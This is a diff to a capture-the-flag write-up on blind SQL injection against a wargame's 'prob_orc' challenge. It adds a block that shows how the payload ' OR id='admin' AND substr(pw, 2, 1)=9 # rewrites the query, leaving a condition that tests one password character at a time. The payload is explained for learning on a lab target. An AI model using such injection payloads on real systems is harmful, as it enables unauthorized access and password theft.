@@ -131,6 +131,16 @@ We can try other characters moving up to the following:
 ?pw=' OR id='admin' AND substr(pw, 2, 1)=9 %23
 ```
 
+```sql
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=9 #'
+
+## Queried part:
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=9
+
+## Commented part:
+'
+```
+
 ![7](https://github.com/Kunull/Write-ups/assets/110326359/fcc7790e-333b-4b3c-b197-bfc02f67788d)
 
 Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
